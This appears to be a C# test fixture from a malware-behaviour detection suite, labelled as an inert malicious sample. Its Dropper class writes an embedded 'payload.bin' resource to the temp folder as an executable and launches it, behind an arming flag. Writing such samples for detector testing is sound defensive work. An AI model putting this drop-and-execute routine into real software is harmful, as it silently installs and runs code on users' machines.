// Inert fixture: never executed (gated by Arm.Armed). BF12d malicious: an embedded managed resource, written to temp and started.
using System;
using System.Diagnostics;
using System.IO;

namespace Behaviour
{
    public static class Dropper
    {
        public static void Run()
        {
            if (!Arm.Armed) return;
            using var stream = typeof(Dropper).Assembly.GetManifestResourceStream("payload.bin");
            using var copy = new MemoryStream();
            stream.CopyTo(copy);
            Drop(copy.ToArray());
        }

        private static void Drop(byte[] bytes)
        {
            var path = Path.Combine(Path.GetTempPath(), "silvergun-behaviour.exe");
            File.WriteAllBytes(path, bytes);
            Process.Start(path);
        }
    }
}
